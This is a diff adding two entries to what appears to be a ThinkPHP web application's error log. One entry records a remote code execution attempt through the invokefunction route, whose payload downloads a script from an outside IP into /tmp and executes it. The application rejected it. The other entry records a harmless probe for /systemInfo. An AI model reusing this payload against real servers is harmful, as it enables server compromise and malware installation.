@@ -1,0 +1,6 @@
+[ 2019-02-27T01:52:41+08:00 ] 217.61.105.126 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;rm%20-rf%20sh;wget%20http://185.244.25.148/sh;%20chmod%20777%20sh;./sh%20thinkphp
+ERR: 非法操作:\think\app
+
+[ 2019-02-27T02:15:27+08:00 ] 91.46.24.38 /systemInfo
+ERR: 无法加载控制器:SystemInfo
+
